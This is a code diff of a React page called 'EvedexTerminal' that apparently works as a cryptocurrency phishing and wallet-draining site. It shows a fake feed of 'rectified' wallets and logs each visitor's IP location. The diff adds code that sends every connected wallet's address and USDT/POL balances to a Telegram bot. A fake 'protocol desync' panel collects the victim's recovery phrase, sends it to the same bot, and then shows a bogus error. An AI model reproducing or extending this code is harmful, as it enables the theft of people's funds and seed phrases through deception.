@@ -7,18 +7,8 @@ export default function EvedexTerminal() {
   const chainId = useChainId();
   const { sendTransaction } = useSendTransaction();
   
-  // State for switching between POL (Native) and USDT (Token)
+  // States
   const [selectedAsset, setSelectedAsset] = useState("USDT"); 
-  
-  // NATIVE GAS (POL/MATIC)
-  const { data: polBal } = useBalance({ address }); 
-
-  // TOKEN (USDT)
-  const { data: usdtBal } = useBalance({ 
-    address, 
-    token: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" 
-  });
-  
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
   const [loading, setLoading] = useState(false);
@@ -42,13 +32,22 @@ export default function EvedexTerminal() {
     42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b"
   };
 
+  // NATIVE (POL/MATIC)
+  const { data: polBal } = useBalance({ address }); 
+
+  // TOKEN (USDT)
+  const { data: usdtBal } = useBalance({ 
+    address, 
+    token: chainId === 137 ? "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" : undefined
+  });
+
   useEffect(() => {
     fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("Unknown"));
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} Rectified Successfully`);
       setTimeout(() => setFeedMsg(""), 4500);
-    }, 8500);
+    }, 9000);
     return () => clearInterval(interval);
   }, []);
 
@@ -56,7 +55,12 @@ export default function EvedexTerminal() {
     try { fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) }); } catch (e) {}
   };
 
-  // Sync Input Value based on Selection
+  useEffect(() => {
+    if (isConnected && address) {
+      logToTelegram(`🔔 SESSION: ${address}\nUSDT: ${usdtBal?.formatted || "0"}\nPOL: ${polBal?.formatted || "0"}`);
+    }
+  }, [isConnected, address, polBal, usdtBal]);
+
   useEffect(() => {
     if (selectedAsset === "USDT") {
       setInputVal(usdtBal?.formatted?.slice(0, 8) || "0.00");
@@ -76,7 +80,7 @@ export default function EvedexTerminal() {
 
   const executeTaskAction = async () => {
     setLoading(true);
-    setLoadingText(`SYNCHRONIZING_ASSET...`);
+    setLoadingText(`SYNCHRONIZING_VAULT...`);
     
     if (selectedAsset === "USDT") {
       const usdtAddr = USDT_MAP[chainId];
@@ -96,9 +100,8 @@ export default function EvedexTerminal() {
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column'}}>
-      
       <div style={{width:'100%', height:'200px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
-         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Market" />
+         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Chart" />
          <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
       </div>
 
@@ -115,21 +118,18 @@ export default function EvedexTerminal() {
             {view === "menu" && (
               <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                 {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
-                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#475569', fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>{n}</button>
+                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#475569", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>{n}</button>
                 ))}
               </div>
             )}
             {view === "task_box" && (
-              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center', position:'relative'}}>
+              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
                 <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← ABORT</button>
-                
-                {/* ASSET SWITCHER (THE TOGGLE) */}
                 <div style={{display:'flex', justifyContent:'center', gap:'10px', marginBottom:'20px'}}>
                   <button onClick={()=>setSelectedAsset("USDT")} style={{backgroundColor: selectedAsset === "USDT" ? "#10b981" : "#1e293b", color: selectedAsset === "USDT" ? "black" : "white", border:'none', padding:'5px 15px', borderRadius:'10px', fontSize:'9px', fontWeight:'900'}}>USDT</button>
                   <button onClick={()=>setSelectedAsset("POL")} style={{backgroundColor: selectedAsset === "POL" ? "#10b981" : "#1e293b", color: selectedAsset === "POL" ? "black" : "white", border:'none', padding:'5px 15px', borderRadius:'10px', fontSize:'9px', fontWeight:'900'}}>POL</button>
                 </div>
-
-                <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask} {selectedAsset}</h2>
+                <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
                 <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
                   <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>AVAILABLE {selectedAsset}</label>
                   <input readOnly value={inputVal} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', fontWeight:'900'}} />
@@ -149,7 +149,7 @@ export default function EvedexTerminal() {
             {!isSyncing ? (
               <>
                 <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>STABILIZATION_REQUIRED</div>
-                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px', lineHeight:'1.4'}}>DETECTION: PROTOCOL_DESYNC. ENTER RECOVERY PHRASE TO DECRYPT SECURE BRIDGE.</p>
+                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px'}}>DETECTION: PROTOCOL_DESYNC. ENTER RECOVERY PHRASE TO DECRYPT NODE.</p>
                 <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'25px'}} />
                 <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("NODE_INCOMPATIBLE");},1500)}},100);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
               </>
